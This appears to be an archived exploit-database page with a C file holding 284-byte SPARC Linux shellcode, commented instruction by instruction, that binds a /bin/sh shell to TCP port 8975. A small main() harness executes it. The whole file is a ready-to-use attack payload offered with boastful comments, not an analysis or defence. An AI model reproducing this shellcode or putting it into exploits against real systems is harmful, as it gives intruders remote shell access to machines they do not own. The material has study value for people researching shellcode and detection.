<html><head><title>Linux/sparc - Portbind 8975/tcp - 284 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * 0-day portbind shellcode for all those Sun machines running linux..
 * Coded from scratch, so i take all the credits.
 * It simply binds a pretty shell in port 8975/tcp enjoy.
 * no nulls, no fork, no shit, couldn't be more optimized.
 * enjoy!.
 *
 * Arch   : Sparc
 * OS     : Linux
 * Task   : Portbind
 * Length : 284 Bytes
 *
 * Copyright 2002 killah @ hack . gr
 * All rights reserved.
 *
 */

#define NAME &quot;Sparc Linux Portbind&quot;

char portbind[]=
  &quot;\x9d\xe3\xbf\x78&quot;	//	save  %sp, -136, %sp
  &quot;\x90\x10\x20\x02&quot;	//	mov  2, %o0
  &quot;\x92\x10\x20\x01&quot;	//	mov  1, %o1
  &quot;\x94\x22\x80\x0a&quot;	//	sub  %o2, %o2, %o2
  &quot;\xd0\x23\xa0\x44&quot;	//	st  %o0, [ %sp + 0x44 ]
  &quot;\xd2\x23\xa0\x48&quot;	//	st  %o1, [ %sp + 0x48 ]
  &quot;\xd4\x23\xa0\x4c&quot;	//	st  %o2, [ %sp + 0x4c ]
  &quot;\x90\x10\x20\x01&quot;	//	mov  1, %o0
  &quot;\x92\x03\xa0\x44&quot;	//	add  %sp, 0x44, %o1
  &quot;\x82\x10\x20\xce&quot;	//	mov  0xce, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\xd0\x27\xbf\xf4&quot;	//	st  %o0, [ %fp + -12 ]
  &quot;\x90\x10\x20\x02&quot;	//	mov  2, %o0
  &quot;\xd0\x37\xbf\xd8&quot;	//	sth  %o0, [ %fp + -40 ]
  &quot;\x13\x08\xc8\xc8&quot;	//	sethi  %hi(0x23232000), %o1
  &quot;\x90\x12\x63\x0f&quot;	//	or  %o1, 0x30f, %o0
  &quot;\xd0\x37\xbf\xda&quot;	//	sth  %o0, [ %fp + -38 ]
  &quot;\xc0\x27\xbf\xdc&quot;	//	clr  [ %fp + -36 ]
  &quot;\x92\x07\xbf\xd8&quot;	//	add  %fp, -40, %o1
  &quot;\xd0\x07\xbf\xf4&quot;	//	ld  [ %fp + -12 ], %o0
  &quot;\x94\x10\x20\x10&quot;	//	mov  0x10, %o2
  &quot;\xd0\x23\xa0\x44&quot;	//	st  %o0, [ %sp + 0x44 ]
  &quot;\xd2\x23\xa0\x48&quot;	//	st  %o1, [ %sp + 0x48 ]
  &quot;\xd4\x23\xa0\x4c&quot;	//	st  %o2, [ %sp + 0x4c ]
  &quot;\x90\x10\x20\x02&quot;	//	mov  2, %o0
  &quot;\x92\x03\xa0\x44&quot;	//	add  %sp, 0x44, %o1
  &quot;\x82\x10\x20\xce&quot;	//	mov  0xce, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\xd0\x07\xbf\xf4&quot;	//	ld  [ %fp + -12 ], %o0
  &quot;\x92\x10\x20\x05&quot;	//	mov  5, %o1
  &quot;\xd0\x23\xa0\x44&quot;	//	st  %o0, [ %sp + 0x44 ]
  &quot;\xd2\x23\xa0\x48&quot;	//	st  %o1, [ %sp + 0x48 ]
  &quot;\x90\x10\x20\x04&quot;	//	mov  4, %o0
  &quot;\x92\x03\xa0\x44&quot;	//	add  %sp, 0x44, %o1
  &quot;\x82\x10\x20\xce&quot;	//	mov  0xce, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\x92\x07\xbf\xd8&quot;	//	add  %fp, -40, %o1
  &quot;\x94\x07\xbf\xec&quot;	//	add  %fp, -20, %o2
  &quot;\xd0\x07\xbf\xf4&quot;	//	ld  [ %fp + -12 ], %o0
  &quot;\xd0\x23\xa0\x44&quot;	//	st  %o0, [ %sp + 0x44 ]
  &quot;\xd2\x23\xa0\x48&quot;	//	st  %o1, [ %sp + 0x48 ]
  &quot;\xd4\x23\xa0\x4c&quot;	//	st  %o2, [ %sp + 0x4c ]
  &quot;\x90\x10\x20\x05&quot;	//	mov  5, %o0
  &quot;\x92\x03\xa0\x44&quot;	//	add  %sp, 0x44, %o1
  &quot;\x82\x10\x20\xce&quot;	//	mov  0xce, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\xd0\x27\xbf\xf0&quot;	//	st  %o0, [ %fp + -16 ]
  &quot;\xd0\x07\xbf\xf0&quot;	//	ld  [ %fp + -16 ], %o0
  &quot;\x92\x22\x40\x09&quot;	//	sub  %o1, %o1, %o1
  &quot;\x82\x10\x20\x5a&quot;	//	mov  0x5a, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\xd0\x07\xbf\xf0&quot;	//	ld  [ %fp + -16 ], %o0
  &quot;\x92\x10\x20\x01&quot;	//	mov  1, %o1
  &quot;\x82\x10\x20\x5a&quot;	//	mov  0x5a, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\xd0\x07\xbf\xf0&quot;	//	ld  [ %fp + -16 ], %o0
  &quot;\x92\x10\x20\x02&quot;	//	mov  2, %o1
  &quot;\x82\x10\x20\x5a&quot;	//	mov  0x5a, %g1
  &quot;\x91\xd0\x20\x10&quot;	//	ta  0x10
  &quot;\x2d\x0b\xd8\x9a&quot;	//	sethi  %hi(0x2f626800), %l6
  &quot;\xac\x15\xa1\x6e&quot;	//	or  %l6, 0x16e, %l6
  &quot;\x2f\x0b\xdc\xda&quot;	//	sethi  %hi(0x2f736800), %l7
  &quot;\x90\x0b\x80\x0e&quot;	//	and  %sp, %sp, %o0
  &quot;\x92\x03\xa0\x08&quot;	//	add  %sp, 8, %o1
  &quot;\x94\x22\x80\x0a&quot;	//	sub  %o2, %o2, %o2
  &quot;\x9c\x03\xa0\x10&quot;	//	add  %sp, 0x10, %sp
  &quot;\xec\x3b\xbf\xf0&quot;	//	std  %l6, [ %sp + -16 ]
  &quot;\xd0\x23\xbf\xf8&quot;	//	st  %o0, [ %sp + -8 ]
  &quot;\xc0\x23\xbf\xfc&quot;	//	clr  [ %sp + -4 ]
  &quot;\x82\x10\x20\x3b&quot;	//	mov  0x3b, %g1
  &quot;\x91\xd0\x20\x10&quot;;	//	ta  0x10

int
main() // test that techno-devil!
{
  int (*funct)();
  funct = (int (*)()) portbind;
  printf(&quot;%s shellcode\n\tSize = %d\n&quot;,NAME,strlen(portbind));
  (int)(*funct)();
  exit(0);
}


/* EOF */


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
